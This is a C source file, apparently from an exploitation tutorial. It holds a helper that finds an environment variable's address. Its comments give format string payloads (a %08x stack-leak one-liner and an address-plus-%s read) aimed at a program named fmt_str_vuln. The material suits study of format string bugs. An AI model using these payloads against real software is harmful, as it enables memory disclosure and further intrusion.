#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
HOW TO SEE WHERE THE FORMAT PARAMETER IS READING FROM:
The 12th format parameter will attempt to print the string
located at 0x41414141 (AAAA):
./fmt_str_vuln $(perl -e 'print "AAAA" . "%08x."x12')


HOW TO READ A STRING AT A MEMORY ADDRESS:
Use getenvaddr to find memory location of PATH:
./getenvaddr PATH ./fmt_str_vuln

PATH is at: 0x6127b829 on my computer.

Then use this to print PATH
./fmt_str_vuln $(printf "\x29\xb8\x27\x61")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s
*/

int main(int argc, char* argv[])
{
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
		exit(0);
	}

	ptr = getenv(argv[1]);
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2;
	printf("%s will be at %p\n", argv[1], ptr);

	return 0;
}
